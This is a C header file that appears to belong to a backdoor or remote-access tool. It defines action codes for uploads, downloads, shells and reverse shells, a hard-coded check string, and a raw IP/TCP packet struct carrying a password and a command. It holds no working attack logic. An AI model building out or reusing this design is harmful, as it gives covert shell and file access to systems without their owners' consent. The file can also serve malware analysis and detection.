#ifndef ACTIONS_H
#define ACTIONS_H

#include <netinet/ip.h>
#include <netinet/tcp.h>

// actions
#define UPLOAD      1
#define DOWNLOAD    2
#define SHELL       3
#define CHECK       4
#define REVUPLOAD     5
#define REVDOWNLOAD   6
#define REVSHELL      7
#define RAWSESSION  8
#define STOPRAWSESSION  9
#define REVCHECK 10

// connection type
#define CON_TCP 1
#define CON_REV 2
#define CON_RAW 3
#define LISTEN 4

#define BUFSIZE 256
// special char
#define ECHAR 0x0b
#define TIMEOUT 60
#define MAXRAWSESSIONS 10
#define CHECKSTR "laom6uSh8eidevah4ee7"

#if DEBUG 
#define debug(...) \
    fprintf(stderr, "[%d] ", getpid()); \
    fprintf(stderr, __VA_ARGS__); 
#else
#define debug(...) 
#endif 

// structs
struct data {
    unsigned char pass[20];
    unsigned short port;
    unsigned char action;
    unsigned char subaction;
    unsigned long size;
    unsigned char bytes[BUFSIZE];
} __attribute__ ((packed));

struct packet {
    struct ip ip;
    struct tcphdr tcp;
    unsigned char options[12];
    struct data action;
} __attribute__ ((packed));

// Functions
//__inline__ void debug(char * format, ...);
void sig_child(int n);
inline int max(int a, int b);
unsigned long resolve(const char *host, char *ip);

#endif
